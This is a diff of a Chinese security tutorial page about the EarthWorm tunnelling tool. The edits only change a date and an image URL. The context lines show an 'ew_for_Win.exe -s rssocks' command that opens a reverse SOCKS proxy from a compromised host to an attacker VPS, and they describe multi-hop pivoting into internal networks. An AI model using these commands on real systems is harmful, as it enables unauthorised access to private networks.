@@ -420,7 +420,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-10
+                    2021-08-04
                 </div>
                 
 
@@ -489,7 +489,7 @@ ssocksd 0.0.0.0:1080 &lt;--[10000 usec]--&gt; socks server</code></pre>
 <pre><code>&gt; .\ew_for_Win.exe -s rssocks -d 172.16.214.52 -e 4444</code></pre>
 <p>这条命令表示在本地开启 socks 5 服务，并反弹到 vps 的 4444 端口，如果代理建立成功，在 VPS 端就会看到 <code>rssocks cmd_socket OK!</code> 的提示。</p>
 <p>最后，代理 vps 的 1080 端口就可以访问到目标主机的内网了。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-09_10-24-45.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-09_10-24-45.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h4 id="c、二级网络环境（一）"><a href="#c、二级网络环境（一）" class="headerlink" title="c、二级网络环境（一）"></a>c、二级网络环境（一）</h4><p>有这样的一个网络环境，目标主机A有两个网卡，一个内网地址一个公网地址，但这个主机只能访问内网主机B不能访问其他内网资源，而内网主机B不能访问外网但是能访问内网资源。</p>
 <p>在拿到这两台主机权限后，就可以使用 ew 进行二级跳板访问到内网资源。</p>
 <pre><code>内网主机A（有公网IP） --》内网主机B --》内网资源</code></pre>
